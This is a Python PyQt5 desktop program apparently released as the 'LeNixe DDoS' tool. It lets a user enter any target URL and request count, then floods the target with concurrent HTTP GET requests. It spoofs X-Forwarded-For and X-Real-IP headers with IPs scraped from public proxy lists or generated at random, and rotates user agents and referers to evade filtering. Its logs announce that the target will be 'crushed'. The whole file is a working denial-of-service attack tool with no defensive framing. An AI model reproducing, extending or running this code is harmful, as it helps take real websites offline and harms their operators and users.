import sys
import asyncio
import aiohttp
import random
import re
import itertools
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
    QLineEdit, QPushButton, QMessageBox, QTextEdit
)
from PyQt5.QtGui import QPixmap, QPalette, QColor
from PyQt5.QtCore import QThread, pyqtSignal, Qt
from io import BytesIO
import requests
import string
import time
from PyQt5.QtWidgets import QHBoxLayout, QVBoxLayout



user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0",
    "Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/80.0.3987.95 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
]


proxy_sources = [
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
    "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1",
    "https://hasdata.com/free-proxy-list",
    "https://www.proxyrack.com/free-proxy-list/",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/proxies.txt",
    "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-List/main/proxies.txt"
]

class AttackThread(QThread):
    log_signal = pyqtSignal(str)

    def __init__(self, target_url, num_requests):
        super().__init__()
        self.target_url = target_url
        self.num_requests = num_requests
        self.max_concurrent = 100  
        self.request_limit = 50000000000  

    async def fetch_ip_addresses(self, url):
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url, timeout=5) as response:
                    text = await response.text()
                    ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)
                    return ip_addresses
            except Exception as e:
                self.log_signal.emit(f"Failed to fetch IPs from {url}: {e}")
                return []

    async def get_all_ips(self):
        tasks = [self.fetch_ip_addresses(url) for url in proxy_sources]
        ip_lists = await asyncio.gather(*tasks, return_exceptions=True)
        all_ips = [ip for sublist in ip_lists if isinstance(sublist, list) for ip in sublist]
        all_ips.extend([f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}" for _ in range(500)])
        return all_ips

    async def send_request(self, session, ip_address):
        headers = {
            "User-Agent": random.choice(user_agents),
            "X-Forwarded-For": ip_address,
            "Accept": random.choice(["text/html", "application/json", "text/plain", "*/*"]),
            "Accept-Language": random.choice(["en-US", "pl-PL", "de-DE", "fr-FR", "es-ES", "it-IT"]),
            "Accept-Encoding": random.choice(["gzip", "deflate", "br"]),
            "Cache-Control": "no-cache",
            "Connection": random.choice(["keep-alive", "close"]),
            "X-Real-IP": ip_address,
            "X-Request-ID": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "Referer": random.choice(["https://google.com", "https://bing.com", "https://yahoo.com", self.target_url, "https://duckduckgo.com"]),
            "Origin": random.choice(["https://example.com", self.target_url, "https://randomsite.com"])
        }
        try:
            async with session.get(self.target_url, headers=headers, timeout=2) as response:
                self.log_signal.emit(f"LeNIxe@root -> {self.target_url} with IP: {ip_address} - Status: {response.status}")
        except Exception:
            pass  

    async def attack_worker(self, session, ip_cycle, requests_per_worker):
        for _ in range(requests_per_worker):
            await self.send_request(session, next(ip_cycle))
            await asyncio.sleep(1 / self.request_limit)  

    async def attack(self):
        ip_list = await self.get_all_ips()
        if not ip_list:
            self.log_signal.emit("No IP list found. Generating random IPs...")
            ip_list = [f"10.0.{random.randint(0, 255)}.{random.randint(0, 255)}" for _ in range(1000)]
        ip_cycle = itertools.cycle(ip_list)
        requests_per_worker = self.num_requests // self.max_concurrent

        async def worker():
            async with aiohttp.ClientSession() as session:
                await self.attack_worker(session, ip_cycle, requests_per_worker)

        start_time = time.time()
        tasks = [worker() for _ in range(self.max_concurrent)]
        await asyncio.gather(*tasks, return_exceptions=True)
        elapsed_time = time.time() - start_time
        self.log_signal.emit(f"Attack finished in {elapsed_time:.2f} seconds. Target down!")

    def run(self):
        asyncio.run(self.attack())

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("LeNixe")
        self.setGeometry(300, 300, 800, 350)

        # === TŁO ===
        central_widget = QWidget(self)
        self.setCentralWidget(central_widget)
        background_label = QLabel(central_widget)
        background_label.setGeometry(0, 0, 800, 450)
        pixmap = QPixmap()
        pixmap.loadFromData(
            requests.get("https://i.pinimg.com/736x/0d/e7/8d/0de78dd13f1fa9f50cc134ee79e5dcb1.jpg").content)
        background_label.setPixmap(pixmap)
        background_label.setScaledContents(True)
        background_label.lower()

        # === GŁÓWNY UKŁAD ===
        main_layout = QHBoxLayout()
        central_widget.setLayout(main_layout)

        # === LEWA STRONA: LOGI + OBRAZEK ===
        left_layout = QVBoxLayout()

        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("""
            background: rgba(25, 25, 25, 0.5);
            color: #ffb3c6;
            border: 2px solid #ff4d88;
            border-radius: 10px;
            font-family: Consolas;
            padding: 6px;
        """)
        left_layout.addWidget(self.log_output)

        self.image_label = QLabel()
        self.image_label.setAlignment(Qt.AlignCenter)
        self.image_label.setStyleSheet("background-color: rgba(0,0,0,0);")
        left_layout.addWidget(self.image_label)

        main_layout.addLayout(left_layout, 2)

        
        right_widget = QWidget()
        right_layout = QVBoxLayout()
        right_widget.setLayout(right_layout)
        right_widget.setStyleSheet("""
            background-color: rgba(255, 255, 255, 0.06);
            border-radius: 25px;
            padding: 16px;
        """)

        title = QLabel("𝕃𝔼ℕ𝕀𝕏𝔼 𝔻𝔻𝕆𝕊")
        title.setStyleSheet("""
            color: #ffffff;
            font-size: 24px;
            font-weight: 600;
            font-family: 'JetBrains Mono', monospace;
            letter-spacing: 1px;
            text-shadow: 0px 0px 5px #ff89c7;
        """)
        right_layout.addWidget(title)

        slogan = QLabel("🧠 <i>TikTok: 𝐥𝐞𝐧𝐢𝐱𝐞𝟕𝟕</i><br>🧠 <i>GitHub: 𝐊𝐚𝐦𝐩𝐮𝐬𝐞𝐞-𝐮𝐱</i>")
        slogan.setStyleSheet("""
            color: #ffe6f0;
            font-size: 12px;
            font-style: italic;
            font-family: 'Poppins', sans-serif;
        """)
        slogan.setTextFormat(Qt.RichText)
        right_layout.addWidget(slogan)

        self.url_label = QLabel("Target URL:")
        self.url_label.setStyleSheet("""
            color: #ffffff;
            font-weight: bold;
            font-family: 'Poppins';
            font-size: 12px;
        """)
        right_layout.addWidget(self.url_label)

        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("𝒉𝒕𝒕𝒑𝒔://𝒆𝒙𝒂𝒎𝒑𝒍𝒆.𝒄𝒐𝒎")
        self.url_input.setStyleSheet("""
            background-color: #2a2a2a;
            color: white;
            padding: 8px;
            border: 2px solid #ff80bf;
            border-radius: 15px;
            font-family: 'JetBrains Mono';
        """)
        right_layout.addWidget(self.url_input)

        self.requests_label = QLabel("Number of Requests:")
        self.requests_label.setStyleSheet("""
            color: #ffffff;
            font-weight: bold;
            font-family: 'Poppins';
            font-size: 12px;
        """)
        right_layout.addWidget(self.requests_label)

        self.requests_input = QLineEdit()
        self.requests_input.setPlaceholderText("𝟏𝟎𝟎𝟎")
        self.requests_input.setStyleSheet("""
            background-color: #2a2a2a;
            color: white;
            padding: 8px;
            border: 2px solid #ff80bf;
            border-radius: 15px;
            font-family: 'JetBrains Mono';
        """)
        right_layout.addWidget(self.requests_input)

        self.start_button = QPushButton("🎀 Start Attack")
        self.start_button.setStyleSheet("""
            QPushButton {
                background-color: qlineargradient(
                    spread:pad, x1:0, y1:0, x2:1, y2:1,
                    stop:0 #ff80bf, stop:1 #ff66cc);
                color: white;
                border-radius: 20px;
                font-weight: bold;
                font-size: 14px;
                font-family: 'Poppins';
                padding: 10px 20px;
            }
            QPushButton:hover {
                background-color: #ff3399;
                color: #fff;
            }
        """)
        self.start_button.clicked.connect(self.start_attack)
        right_layout.addWidget(self.start_button)

        right_layout.addStretch()
        main_layout.addWidget(right_widget, 1)

        

    def log_message(self, message):
        self.log_output.append(message)

    def load_image(self, image_url):
        try:
            response = requests.get(image_url)
            response.raise_for_status()
            pixmap = QPixmap()
            pixmap.loadFromData(BytesIO(response.content).getvalue())
            self.image_label.setPixmap(pixmap.scaled(400, 400, Qt.KeepAspectRatio))
        except Exception as e:
            self.log_message(f"Image load error: {e}")

    def start_attack(self):
        target_url = self.url_input.text()
        try:
            num_requests = int(self.requests_input.text())
        except ValueError:
            QMessageBox.critical(self, "LeNIxe", "Number of requests must be an integer!")
            return

        if not target_url or num_requests <= 0:
            QMessageBox.critical(self, "LeNIxe", "Enter a valid URL and number of requests!")
            return

        self.log_message("DDoS attack started. Target will be crushed!")

        self.attack_thread = AttackThread(target_url, num_requests)
        self.attack_thread.log_signal.connect(self.log_message)
        self.attack_thread.start()
        QMessageBox.information(self, "LeNIxe", "Attack has begun! Check the logs!")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())